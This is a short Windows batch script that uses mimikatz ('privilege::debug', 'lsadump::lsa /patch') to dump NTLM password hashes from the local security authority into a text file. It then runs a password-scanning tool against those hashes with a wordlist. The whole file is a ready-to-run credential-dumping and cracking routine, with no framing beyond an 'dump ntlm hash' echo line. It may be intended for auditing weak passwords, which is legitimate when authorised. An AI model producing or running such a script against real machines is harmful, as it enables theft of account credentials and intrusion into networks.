@echo off
@cd /d %~dp0
@echo dump ntlm hash .....
@mimikatz  "privilege::debug"   "lsadump::lsa /patch"   exit>hash.txt
@ntweakpwdscan.exe -f hash.txt -pass password.txt
@echo finished!
@pause